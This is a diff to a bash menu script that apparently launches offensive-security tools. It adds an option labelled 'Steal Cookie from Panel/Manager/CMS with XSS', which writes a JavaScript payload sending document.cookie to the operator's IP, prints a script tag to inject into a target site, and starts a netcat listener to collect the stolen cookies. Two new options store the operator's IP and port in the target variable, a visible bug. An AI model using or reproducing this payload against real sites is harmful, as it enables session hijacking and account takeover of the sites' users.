@@ -18,6 +18,8 @@ RLS="/releases"
 RLDW="$RLS""/download"
 WBE="For a better experience, please install "
 FMSG="press ENTER to continue..."
+MIP="0.0.0.0"
+MPRT="80"
 TIP="0.0.0.0"
 TPRT="80"
 TUSRN=""
@@ -1171,7 +1173,7 @@ while true; do
 	Stampa " 2547. list all pulled docker images"
 	Stampa " 2548. run a docker image" "2549. docker process list" "2552. use nmap to scan ports for vulnerabilities"
 	Stampa " 2556. Executione command line to Remote IP with RPC" "2564. display all binsry's headers with objdump"
-	Stampa " 2570. Anonymization"
+	Stampa " 2570. Anonymization" "2572. Steal Cookie from Panel/Manager/CMS with XSS"
 	echo "$SEP"
 	echo "VIRTUAL COINS - CURRENCIES"
 	Stampa " 511. Isaacdelly/Plutus" "512. dan-v/bruteforce-bitcoin-brainwallet" "513. SMH17/bitcoin-hacking-tools"
@@ -1269,7 +1271,9 @@ while true; do
 	echo "GLOBAL VARIABLES"
 	Stampa " 2559. Target Username" "2560. Target Password" "2561. Target Domain"
 	Stampa " 2557. Target IP" "2558. Target PORT" "2562. wordlist file" "2563. disassemble binary with objdump"
-	echo -e "\nTarget: ""$TIP"":$TPRT|\tTarget domain: ""$TDOM""|\tTarget username: ""$TUSRN""|\tTarget password: ""$TPSSW""|\tWordlist: ""$WORDLIST"
+	Stampa " 2573. Your IP" "2574. Your Port"
+	echo -e "\nTarget: ""$TIP"":$TPRT|\tTarget domain: ""$TDOM""|\tTarget username: ""$TUSRN""|\tTarget password: ""$TPSSW"""
+	echo -e "Wordlist: ""$WORDLIST""|\tYOU: ""$MIP"":$MPRT\n"
 	echo -e "Anonymization: $ANON"
 	echo "$SEP"
 	read -p "Choose a script: " SCELTA
@@ -10760,6 +10764,36 @@ while true; do
 	;;
 	"2571")
 		Clona "knightm4re/tomcter"
+	;;
+	"2572")
+		if [[ "$MIP" == "" || "$MIP" != "http"* ]];
+		then
+			echo "Digit YOUR IP address with HTTP protocol, choosing between http:// and https://"
+			read -p "(example, http://10.11.12.13): " MIP
+		fi
+		echo "Digit the Target IP address with HTTP protocol, choosing between http:// and https://"
+		read -p "(example, http://10.11.12.14): " TIP
+		if [[ "$TIP" != "" ]];
+		then
+			echo "document.write('<img src=\"""$MIP""/?'+document.cookie+'\">');" > ./img.js
+			echo "Copy and Pate this javascript code to receive via netcat the cookie in HTTP GET response"
+			echo "<script src=\"""$TIP""/img.js\"></script>"
+			if [[ "$MIP" == "https://"* ]];
+			then
+				sudo nc -lvnp 443
+			elif [[ "$MIP" == "http://"* ]];
+			then
+				sudo nc -lvnp 80
+			fi
+		fi
+	;;
+	"2573")
+		echo "Digit Your IP with or without PROTOCOL"
+		read -p "(example 192.168.168.2 or http://192.168.168.2): " TIP
+	;;
+	"2574")
+		echo "Digit Your Port"
+		read -p "(example 80): " TIP
 	;;
 	*)
 		echo "error, invalid choice"
